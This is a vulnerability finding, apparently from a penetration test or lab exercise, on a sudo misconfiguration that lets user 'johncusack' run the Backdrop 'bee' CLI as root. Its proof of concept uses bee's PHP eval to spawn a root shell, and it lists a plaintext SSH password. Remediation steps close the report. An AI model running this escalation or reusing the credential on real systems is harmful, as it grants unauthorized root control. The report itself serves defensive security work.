# Privilege Escalation via Insecure sudo Configuration on Backdrop Bee

**ID:** vuln-0003
**Severity:** HIGH
**Found:** 2026-02-28 07:54:41 UTC
**Target:** 10.129.231.223
**CWE:** CWE-269
**CVSS:** 8.8

## Description

The local user `johncusack` is configured with `sudo` privileges to execute the `/usr/local/bin/bee` utility as `root` without restriction. The `bee` tool (Backdrop CLI) contains an `eval` command feature that allows arbitrary PHP code execution within the context of the Backdrop CMS environment.

Since the utility can be executed via `sudo`, an attacker who gains access to the `johncusack` account can execute arbitrary system commands as `root` by leveraging the PHP `eval` command, thereby achieving full privilege escalation and complete control of the server.

## Impact

An attacker with access to the `johncusack` user account can escalate privileges to `root`. This allows full administrative control over the underlying operating system, leading to complete system compromise, the ability to read all files (including `/root/root.txt`), and lateral movement capabilities.

## Technical Analysis

The `/etc/sudoers` file or a related configuration file under `/etc/sudoers.d/` grants the `johncusack` user the ability to run `/usr/local/bin/bee` (which is a symbolic link to `/backdrop_tool/bee/bee.php`) as any user, including `root`.

The `bee` utility provides a command-line interface for Backdrop CMS and includes a feature to evaluate arbitrary PHP code using the `eval` subcommand (e.g., `php-eval`). When `bee` is executed with `sudo`, any PHP code provided to `eval` is executed with `root` privileges.

An attacker can use PHP's built-in command execution functions (like `system()`, `exec()`, or `shell_exec()`) within the `eval` command to spawn a root shell or execute arbitrary operating system commands.

## Proof of Concept

1. Authenticate to the system as the user `johncusack` (e.g., via SSH using the password `BackDropJ2024DS2024`).
2. Run `sudo -l` to verify the user has permission to run `/usr/local/bin/bee` as `root`.
3. Navigate to the web root directory where the Backdrop CMS is installed (e.g., `cd /var/www/html`), which is necessary for `bee` to bootstrap correctly without the `--root` argument.
4. Execute arbitrary PHP code as root using the following command:
   `sudo /usr/local/bin/bee eval "system('/bin/bash');"`
5. This command spawns an interactive root shell, yielding full administrative access.

```
# Execute as user 'johncusack'
cd /var/www/html
sudo /usr/local/bin/bee eval "system('/bin/bash');"
# id -> uid=0(root) gid=0(root) groups=0(root)
```

## Remediation

1. Remove the `sudo` configuration that allows the `johncusack` user to execute `/usr/local/bin/bee` as `root`.
2. If `bee` must be executed via `sudo` for administrative tasks, consider restricting the allowed arguments or writing a secure wrapper script that only permits specific, non-exploitable commands. However, since `bee` is designed to interact with a complex framework and includes a native `eval` functionality, it is inherently dangerous to allow it to run with elevated privileges.
3. Apply the Principle of Least Privilege, ensuring users only have the minimum permissions necessary to perform their roles.
